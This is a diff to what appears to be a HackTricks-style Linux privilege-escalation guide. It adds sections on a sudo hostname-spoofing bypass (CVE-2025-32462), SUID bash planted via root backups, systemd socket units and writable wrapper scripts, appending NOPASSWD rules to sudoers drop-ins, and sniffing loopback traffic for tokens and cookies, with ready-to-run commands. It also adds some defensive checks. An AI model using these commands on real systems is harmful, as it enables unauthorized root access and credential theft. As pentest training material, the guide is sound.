@@ -100,6 +100,31 @@ Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit th
 
 For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
 
+### Sudo host-based rules bypass (CVE-2025-32462)
+
+Sudo before 1.9.17p1 (reported affected range: **1.8.8–1.9.17**) can evaluate host-based sudoers rules using the **user-supplied hostname** from `sudo -h <host>` instead of the **real hostname**. If sudoers grants broader privileges on another host, you can **spoof** that host locally.
+
+Requirements:
+- Vulnerable sudo version
+- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)
+
+Example sudoers pattern:
+
+```
+Host_Alias     SERVERS = devbox, prodbox
+Host_Alias     PROD    = prodbox
+alice          SERVERS, !PROD = NOPASSWD:ALL
+```
+
+Exploit by spoofing the allowed host:
+
+```bash
+sudo -h devbox id
+sudo -h devbox -i
+```
+
+If resolution of the spoofed name blocks, add it to `/etc/hosts` or use a hostname that already appears in logs/configs to avoid DNS lookups.
+
 #### sudo < v1.8.28
 
 From @sickrov
@@ -172,13 +197,13 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
 ```
 
-## Docker Breakout
+## Container Breakout
 
-If you are inside a docker container you can try to escape from it:
+If you are inside a container, start with the following container-security section and then pivot into the runtime-specific abuse pages:
 
 
 {{#ref}}
-docker-security/
+container-security/
 {{#endref}}
 
 ## Drives
@@ -232,6 +257,53 @@ top -n 1
 
 Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
 Also **check your privileges over the processes binaries**, maybe you can overwrite someone.
+
+### Cross-user parent-child chains
+
+A child process running under a **different user** than its parent is not automatically malicious, but it is a useful **triage signal**. Some transitions are expected (`root` spawning a service user, login managers creating session processes), but unusual chains can reveal wrappers, debug helpers, persistence, or weak runtime trust boundaries.
+
+Quick review:
+
+```bash
+ps -eo pid,ppid,user,comm,args --sort=ppid
+pstree -alp
+```
+
+If you find a surprising chain, inspect the parent command line and all files that influence its behavior (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). In several real privesc paths the child itself was not writable, but the **parent-controlled config** or helper chain was.
+
+### Deleted executables and deleted-open files
+
+Runtime artifacts are often still accessible **after deletion**. This is useful both for privilege escalation and for recovering evidence from a process that already has sensitive files open.
+
+Check for deleted executables:
+
+```bash
+pid=<PID>
+ls -l /proc/$pid/exe
+readlink /proc/$pid/exe
+tr '\0' ' ' </proc/$pid/cmdline; echo
+```
+
+If `/proc/<PID>/exe` points to `(deleted)`, the process is still running the old binary image from memory. That is a strong signal to investigate because:
+
+- the removed executable may contain interesting strings or credentials
+- the running process may still expose useful file descriptors
+- a deleted privileged binary can indicate recent tampering or attempted cleanup
+
+Collect deleted-open files globally:
+
+```bash
+lsof +L1
+```
+
+If you find an interesting descriptor, recover it directly:
+
+```bash
+ls -l /proc/<PID>/fd
+cat /proc/<PID>/fd/<FD>
+```
+
+This is especially valuable when a process still has a deleted secret, script, database export, or flag file open.
 
 ### Process monitoring
 
@@ -434,6 +506,15 @@ ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
 
+If `run-parts` is used, check which names will really execute:
+
+```bash
+run-parts --test /etc/cron.hourly
+run-parts --test /etc/cron.daily
+```
+
+This avoids false positives. A writable periodic directory is only useful if your payload filename matches the local `run-parts` rules.
+
 ### Cron path
 
 For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
@@ -506,6 +587,25 @@ If the script executed by root uses a **directory where you have full access**, 
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 
+### Symlink validation and safer file handling
+
+When reviewing privileged scripts/binaries that read or write files by path, verify how links are handled:
+
+- `stat()` follows a symlink and returns metadata of the target.
+- `lstat()` returns metadata of the link itself.
+- `readlink -f` and `namei -l` help resolve the final target and show permissions of each path component.
+
+```bash
+readlink -f /path/to/link
+namei -l /path/to/link
+```
+
+For defenders/developers, safer patterns against symlink tricks include:
+
+- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
+- `openat()`: operate relative to a trusted directory file descriptor.
+- `mkstemp()`: create temporary files atomically with secure permissions.
+
 ### Custom-signed cron binaries with writable payloads
 Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:
 
@@ -540,12 +640,44 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 **You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).
 
+### Root backups that preserve attacker-set mode bits (pg_basebackup)
+
+If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.
+
+Typical discovery flow (as a low-priv DB user):
+- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
+- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.
+
+Exploit:
+
+```bash
+# As the DB service user owning the cluster directory
+cd /var/lib/postgresql/14/main
+cp /bin/bash .
+chmod 6777 bash
+
+# Wait for the next root backup run (pg_basebackup preserves permissions)
+ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
+/opt/backups/current/bash -p    # root shell without dropping privileges
+```
+
+This works because `pg_basebackup` preserves file mode bits when copying the cluster; when invoked by root the destination files inherit **root ownership + attacker-chosen SUID/SGID**. Any similar privileged backup/copy routine that keeps permissions and writes into an executable location is vulnerable.
+
 ### Invisible cron jobs
 
 It's possible to create a cronjob **putting a carriage return after a comment** (without newline character), and the cron job will work. Example (note the carriage return char):
 
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
+```
+
+To detect this kind of stealth entry, inspect cron files with tools that expose control characters:
+
+```bash
+cat -A /etc/crontab
+cat -A /etc/cron.d/*
+sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
+xxd /etc/crontab | head
 ```
 
 ## Services
@@ -638,6 +770,35 @@ Sockets can be configured using `.socket` files.
 If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
 _Note that the system must be using that socket file configuration or the backdoor won't be executed_
 
+### Socket activation + writable unit path (create missing service)
+
+Another high-impact misconfiguration is:
+
+- a socket unit with `Accept=no` and `Service=<name>.service`
+- the referenced service unit is missing
+- an attacker can write into `/etc/systemd/system` (or another unit search path)
+
+In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.
+
+Quick flow:
+
+```bash
+systemctl cat vuln.socket
+# [Socket]
+# Accept=no
+# Service=vuln.service
+```
+
+```bash
+cat >/etc/systemd/system/vuln.service <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
+EOF
+nc -q0 127.0.0.1 9999
+/var/tmp/rootbash -p
+```
+
 ### Writable sockets
 
 If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.
@@ -671,7 +832,7 @@ socket-command-injection.md
 Note that there may be some **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). You can check this with:
 
 ```bash
-curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
+curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
 ```
 
 If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.
@@ -729,11 +890,11 @@ After setting up the `socat` connection, you can execute commands directly in th
 
 Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Check **more ways to break out from docker or abuse it to escalate privileges** in:
+Check **more ways to break out from containers or abuse container runtimes to escalate privileges** in:
 
 
 {{#ref}}
-docker-security/
+container-security/
 {{#endref}}
 
 ## Containerd (ctr) privilege escalation
@@ -793,22 +954,76 @@ It's always interesting to enumerate the network and figure out the position of 
 cat /etc/hostname /etc/hosts /etc/resolv.conf
 dnsdomainname
 
+#NSS resolution order (hosts file vs DNS)
+grep -E '^(hosts|networks):' /etc/nsswitch.conf
+getent hosts localhost
+
 #Content of /etc/inetd.conf & /etc/xinetd.conf
 cat /etc/inetd.conf /etc/xinetd.conf
 
 #Interfaces
 cat /etc/networks
 (ifconfig || ip a)
+(ip -br addr || ip addr show)
+
+#Routes and policy routing (pivot paths)
+ip route
+ip -6 route
+ip rule
+ip route get 1.1.1.1
+
+#L2 neighbours
+(arp -e || arp -a || ip neigh)
 
 #Neighbours
 (arp -e || arp -a)
 (route || ip n)
 
+#L2 topology (VLANs/bridges/bonds)
+ip -d link
+bridge link 2>/dev/null
+
+#Network namespaces (hidden interfaces/routes in containers)
+ip netns list 2>/dev/null
+ls /var/run/netns/ 2>/dev/null
+nsenter --net=/proc/1/ns/net ip a 2>/dev/null
+
 #Iptables rules
 (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)
 
+#nftables and firewall wrappers (modern hosts)
+sudo nft list ruleset 2>/dev/null
+sudo nft list ruleset -a 2>/dev/null
+sudo ufw status verbose 2>/dev/null
+sudo firewall-cmd --state 2>/dev/null
+sudo firewall-cmd --list-all 2>/dev/null
+
+#Forwarding / asymmetric routing / conntrack state
+sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
+sudo conntrack -L 2>/dev/null | head -n 20
+
 #Files used by network services
 lsof -i
+```
+
+### Outbound filtering quick triage
+
+If the host can run commands but callbacks fail, separate DNS, transport, proxy, and route filtering quickly:
+
+```bash
+# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
+dig +time=2 +tries=1 @1.1.1.1 google.com A
+dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A
+
+# Common outbound ports
+for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done
+
+# Route/path clue for 443 filtering
+sudo traceroute -T -p 443 example.org 2>/dev/null || true
+
+# Proxy-enforced environments and remote-DNS SOCKS testing
+env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
+curl --socks5-hostname <ip>:1080 https://ifconfig.me
 ```
 
 ### Open ports
@@ -818,7 +1033,58 @@ Always check network services running on the machine that you weren't able to in
 ```bash
 (netstat -punta || ss --ntpu)
 (netstat -punta || ss --ntpu) | grep "127.0"
+ss -tulpn
+#Quick view of local bind addresses (great for hidden/isolated interfaces)
+ss -tulpn | awk '{print $5}' | sort -u
 ```
+
+Classify listeners by bind target:
+
+- `0.0.0.0` / `[::]`: exposed on all local interfaces.
+- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
+- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually reachable only from internal segments.
+
+### Local-only service triage workflow
+
+When you compromise a host, services bound to `127.0.0.1` often become reachable for the first time from your shell. A quick local workflow is:
+
+```bash
+# 1) Find local listeners
+ss -tulnp
+
+# 2) Discover open localhost TCP ports
+nmap -Pn --open -p- 127.0.0.1
+
+# 3) Fingerprint only discovered ports
+nmap -Pn -sV -p <ports> 127.0.0.1
+
+# 4) Manually interact / banner grab
+nc 127.0.0.1 <port>
+printf 'HELP\r\n' | nc 127.0.0.1 <port>
+```
+
+### LinPEAS as a network scanner (network-only mode)
+
+Besides local PE checks, linPEAS can run as a focused network scanner. It uses available binaries in `$PATH` (typically `fping`, `ping`, `nc`, `ncat`) and does not install tooling.
+
+```bash
+# Auto-discover subnets + hosts + quick ports
+./linpeas.sh -t
+
+# Host discovery in CIDR
+./linpeas.sh -d 10.10.10.0/24
+
+# Host discovery + custom ports
+./linpeas.sh -d 10.10.10.0/24 -p 22,80,443
+
+# Scan one IP (default/common ports)
+./linpeas.sh -i 10.10.10.20
+
+# Scan one IP with selected ports
+./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
+```
+
+If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS behaves as a pure network scanner (skipping the rest of privilege-escalation checks).
 
 ### Sniffing
 
@@ -826,6 +1092,32 @@ Check if you can sniff traffic. If you can, you could be able to grab some crede
 
 ```
 timeout 1 tcpdump
+```
+
+Quick practical checks:
+
+```bash
+#Can I capture without full sudo?
+which dumpcap && getcap "$(which dumpcap)"
+
+#Find capture interfaces
+tcpdump -D
+ip -br addr
+```
+
+Loopback (`lo`) is especially valuable in post-exploitation because many internal-only services expose tokens/cookies/credentials there:
+
+```bash
+sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
+  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
+```
+
+Capture now, parse later:
+
+```bash
+sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
+tshark -r /tmp/capture.pcap -Y http.request \
+  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
 ```
 
 ## Users
@@ -844,11 +1136,14 @@ cat /etc/passwd | grep "sh$"
 #List superusers
 awk -F: '($3 == "0") {print}' /etc/passwd
 #Currently logged users
+who
 w
+#Only usernames
+users
 #Login history
 last | tail
 #Last log of each user
-lastlog
+lastlog2 2>/dev/null || lastlog
 
 #List all users and their groups
 for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
@@ -1101,6 +1396,36 @@ export -f /usr/sbin/service
 ```
 
 Then, when you call the suid binary, this function will be executed
+
+### Writable script executed by a SUID wrapper
+
+A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users.
+
+Typical pattern:
+
+```c
+int main(void) {
+    system("/bin/bash /usr/local/bin/backup.sh");
+}
+```
+
+If `/usr/local/bin/backup.sh` is writable, you can append payload commands and then execute the SUID wrapper:
+
+```bash
+echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
+/usr/local/bin/backup_wrap
+/var/tmp/rootbash -p
+```
+
+Quick checks:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
+ls -l /usr/local/bin/backup.sh
+```
+
+This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
@@ -1453,6 +1778,25 @@ setfacl -b file.txt #Remove the ACL of the file
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 
+### Hidden ACL backdoor on sudoers drop-ins
+
+A common misconfiguration is a root-owned file in `/etc/sudoers.d/` with mode `440` that still grants write access to a low-priv user via ACL.
+
+```bash
+ls -l /etc/sudoers.d/*
+getfacl /etc/sudoers.d/<file>
+```
+
+If you see something like `user:alice:rw-`, the user can append a sudo rule despite restrictive mode bits:
+
+```bash
+echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
+visudo -cf /etc/sudoers.d/<file>
+sudo -l
+```
+
+This is a high-impact ACL persistence/privesc path because it is easy to miss in `ls -l`-only reviews.
+
 ## Open shell sessions
 
 In **old versions** you may **hijack** some **shell** session of a different user (**root**).\
@@ -1465,6 +1809,9 @@ In **newest versions** you will be able to **connect** to screen sessions only o
 ```bash
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
+
+# Socket locations (some systems expose one as symlink of the other)
+ls /run/screen/ /var/run/screen/ 2>/dev/null
 ```
 
 ![](<../../images/image (141).png>)
@@ -1517,6 +1864,14 @@ This bug is caused when creating a new ssh key in those OS, as **only 32,768 var
 - **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
 - **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
 - **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
+
+### Login control files
+
+These files influence who can log in and how:
+
+- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
+- **`/etc/securetty`**: restricts where root can log in (TTY allowlist).
+- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).
 
 ### PermitRootLogin
 
@@ -1890,6 +2245,8 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
 - [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
 - [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
+- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
+- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
 
 {{#include ../../banners/hacktricks-training.md}}
